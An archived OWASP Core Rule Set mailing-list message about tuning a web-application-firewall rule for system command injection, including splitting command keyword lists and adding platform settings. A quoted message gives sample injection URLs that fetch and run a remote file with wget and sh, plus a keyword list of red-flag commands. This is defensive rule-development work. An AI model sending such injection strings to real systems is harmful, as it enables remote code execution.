<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3CD2E6B8F1.1A467%25csanders%40trustwave.com%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001947.html">
   <LINK REL="Next"  HREF="001975.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)</H1>
    <B>Chaim Sanders</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3CD2E6B8F1.1A467%25csanders%40trustwave.com%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)">CSanders at trustwave.com
       </A><BR>
    <I>Mon Feb 15 04:07:53 UTC 2016</I>
    <P><UL>
        <LI>Previous message: <A HREF="001947.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
        <LI>Next message: <A HREF="001975.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1959">[ date ]</a>
              <a href="thread.html#1959">[ thread ]</a>
              <a href="subject.html#1959">[ subject ]</a>
              <a href="author.html#1959">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>For the record I think this is a good idea but perhaps outside the scope a
bit of the initial RC release. Christian, I suggest we add this to the
To-do for 3.1. Thoughts?

On 2/12/16, 4:17 PM,
&quot;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A> on behalf of
Christian Folini&quot; &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A>
on behalf of <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>&gt; wrote:

&gt;<i>Hi there,
</I>&gt;<i>
</I>&gt;<i>There has not been any additional feedback in this thread, but I think
</I>&gt;<i>the question is not settled as of this writing.
</I>&gt;<i>
</I>&gt;<i>Thoughts?
</I>&gt;<i>
</I>&gt;<i>Regs,
</I>&gt;<i>
</I>&gt;<i>Christian
</I>&gt;<i>
</I>&gt;<i>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
</I>&gt;&gt;<i> Hi there,
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
</I>&gt;&gt;<i> &gt; I like the idea of splitting the file.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Cool.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; I agree some of the words in os-commands.data seem rather paranoid.
</I>&gt;&gt;<i>Words like &quot;choice&quot;, &quot;help&quot;, &quot;now&#178; seem of low value and are common in
</I>&gt;&gt;<i>natural text. Also, the large number of Unix-only environments could
</I>&gt;&gt;<i>skip Windows related commands. It&#185;s hard for users to modify these lists
</I>&gt;&gt;<i>as you&#185;d have to hack the CRS, and these huge collections are to
</I>&gt;&gt;<i>maintain anyhow, so I agree we need granularity.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Good point.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; The rule has some regexp magic to prevent false positives, but the
</I>&gt;&gt;<i>balance is not a complete success in my opinion. For instance, the
</I>&gt;&gt;<i>following URLs don't trigger in CRSv3:
</I>&gt;&gt;<i> &gt; <A HREF="http://vuln/?cmd=wget%20http://example.com/blah.txt">http://vuln/?cmd=wget%20http://example.com/blah.txt</A>
</I>&gt;&gt;<i> &gt; <A HREF="http://vuln/?cmd=sh%20blah.txt">http://vuln/?cmd=sh%20blah.txt</A>
</I>&gt;&gt;<i> &gt;
</I>&gt;&gt;<i> &gt; So it's not as strong as you would want either to prevent some common
</I>&gt;&gt;<i>RCE.
</I>&gt;&gt;<i> &gt; Something like <A HREF="http://vuln/?cmd=Wget%20http://example.com/;%20ecHo">http://vuln/?cmd=Wget%20http://example.com/;%20ecHo</A>
</I>&gt;&gt;<i>does trigger it.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> I see. Good observations.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; 1) I think that a user should check their desired platforms in the
</I>&gt;&gt;<i>setup conf. In fact, this would be great to do anyway in the initial
</I>&gt;&gt;<i>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
</I>&gt;&gt;<i>platform types will pave the way for reducing false positives and false
</I>&gt;&gt;<i>negatives by skipping unnecessary checks and being more strict on the
</I>&gt;&gt;<i>right platforms. So we could start by listing these platforms in the
</I>&gt;&gt;<i>existing rule in the setup conf. Example:
</I>&gt;&gt;<i> &gt;
</I>&gt;&gt;<i> &gt;    SecAction \
</I>&gt;&gt;<i> &gt;      &quot;id:'900024', \
</I>&gt;&gt;<i> &gt;      phase:1, \
</I>&gt;&gt;<i> &gt;      t:none, \
</I>&gt;&gt;<i> &gt;      setvar:tx.unix=1, \
</I>&gt;&gt;<i> &gt;      setvar:tx.windows=1, \
</I>&gt;&gt;<i> &gt;      setvar:tx.java=1, \
</I>&gt;&gt;<i> &gt;      setvar:tx.php=1, \
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> That makes a lot of sense. At first sight.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> I think that a default install should come with these rulesets
</I>&gt;&gt;<i> all enabled and a sysadmin can then switch them of if we is aware that
</I>&gt;&gt;<i> there is no php in his service.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> So given the following two scenarios
</I>&gt;&gt;<i> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
</I>&gt;&gt;<i>positives
</I>&gt;&gt;<i>     because he does not disable unneeded rulesets
</I>&gt;&gt;<i> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not
</I>&gt;&gt;<i>enable
</I>&gt;&gt;<i>     the php protection
</I>&gt;&gt;<i> I strongly favour #1.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> A vanilla install of the core rules should give you a full coverage for
</I>&gt;&gt;<i>all
</I>&gt;&gt;<i> types of services and a decent security level. Reducing false positives
</I>&gt;&gt;<i>by
</I>&gt;&gt;<i> omitting certain rules (ideally rules which provide no value for your
</I>&gt;&gt;<i>setup)
</I>&gt;&gt;<i> is the very idea of tuning.
</I>&gt;&gt;<i> Reducing the initial number of false positives by moving certain rules
</I>&gt;&gt;<i> with a worse relationsship between added security and false positives,
</I>&gt;&gt;<i> that is the idea of the paranoia mode.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Chaim stated in a different message, that the rules are now organised
</I>&gt;&gt;<i> into files aimed at certain environments. So switching them off is
</I>&gt;&gt;<i> fairly easy. And there are the tags on top of it.
</I>&gt;&gt;<i> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
</I>&gt;&gt;<i> disable them all very easily.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> So I think, we do not need these variables.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; (By the way: I think it&#185;s unfortunate that a user has to use value 1
</I>&gt;&gt;<i>to enable a check. An undefined variable will mean that the CRS will
</I>&gt;&gt;<i>skip some rules. This makes it dangerous to introduce a new variable in
</I>&gt;&gt;<i>the CRS later; all existing installations MUST then add this variable to
</I>&gt;&gt;<i>their setup rule immediately, or suffer from reduced security. It&#185;s
</I>&gt;&gt;<i>better to use a scheme that defaults to &#179;on&#178;. A convention like
</I>&gt;&gt;<i>&#179;tx.disable_mysql=1&#178; would be user unfriendly and error-prone. But we
</I>&gt;&gt;<i>could check for an explicit &#179;off&#178; string, e.g. &#179;setvar:tx.mysql=off&#178;. If
</I>&gt;&gt;<i>it&#185;s not &#179;off&#178; then assume that the user DOES want the check. I think
</I>&gt;&gt;<i>it&#185;s important to get this right in 3.0.0, it will be more painful to do
</I>&gt;&gt;<i>it later.)
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> That's a very good observation. I had a similar idea once.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> In programming, you usually start with a default value and then
</I>&gt;&gt;<i> the users overrides the default value. If he wants to.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> I am not sure how modsecurity_crs_10_setup.conf.example is going to
</I>&gt;&gt;<i> be transformed to work seamlessly with 3.0. But this makes the
</I>&gt;&gt;<i> setting of default values a bit tricky.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
</I>&gt;&gt;<i> if certain variables are not set.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; 2) Separate the words into multiple lists:
</I>&gt;&gt;<i> &gt;    os-commands-critical.data (absolute red flag list: &quot;curl&quot;, &quot;passwd&quot;,
</I>&gt;&gt;<i>&quot;sh&quot;, &quot;uname&quot;, &quot;wget&quot; etc.)
</I>&gt;&gt;<i> &gt;    os-commands-paranoid.data (absolute low value, but high FP natural
</I>&gt;&gt;<i>words like &quot;choice&quot;)
</I>&gt;&gt;<i> &gt;    os-commands-windows.data (all Windows commands)
</I>&gt;&gt;<i> &gt;    os-commands-common.data (all other commands)
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Makes some sense. Too granular is difficult and you mix various
</I>&gt;&gt;<i> grouping criteria (criticality, paranoia, os), which makes is a
</I>&gt;&gt;<i> bit hard to follow.
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Other opinions?
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> &gt; 3) Review the current regexp against some test data and CRSv2 to make
</I>&gt;&gt;<i>it more sensitive
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Good plan. Maybe this could be done in a separate pull request.
</I>&gt;&gt;<i> I am afraid to overload the paranoia mode pull request...
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Ahoj,
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> Christian
</I>&gt;&gt;<i>
</I>&gt;&gt;<i>
</I>&gt;&gt;<i> --
</I>&gt;&gt;<i> In war you will generally find that the enemy has at any time
</I>&gt;&gt;<i> three courses of action open to him. Of those three, he will
</I>&gt;&gt;<i> invariably choose the fourth.
</I>&gt;&gt;<i> -- Helmuth Von Moltke
</I>&gt;&gt;<i> _______________________________________________
</I>&gt;&gt;<i> Owasp-modsecurity-core-rule-set mailing list
</I>&gt;&gt;<i> <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;&gt;<i>
</I>&gt;&gt;<i><A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOIn">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOIn</A>
</I>&gt;&gt;<i>uYrNabyug&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
</I>&gt;&gt;<i>owasp-modsecurity-core-rule-set
</I>&gt;<i>
</I>&gt;<i>--
</I>&gt;<i>mailto:<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>
</I>&gt;<i><A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu</A>
</I>&gt;<i>N-aaCptw&amp;s=5&amp;u=http%3a%2f%2fwww%2echristian-folini%2ech
</I>&gt;<i>twitter: @ChrFolini
</I>&gt;<i>_______________________________________________
</I>&gt;<i>Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i><A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i><A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meOInu</A>
</I>&gt;<i>YrNabyug&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
</I>&gt;<i>asp-modsecurity-core-rule-set
</I>

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
</PRE>



<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001947.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
	<LI>Next message: <A HREF="001975.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1959">[ date ]</a>
              <a href="thread.html#1959">[ thread ]</a>
              <a href="subject.html#1959">[ subject ]</a>
              <a href="author.html#1959">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
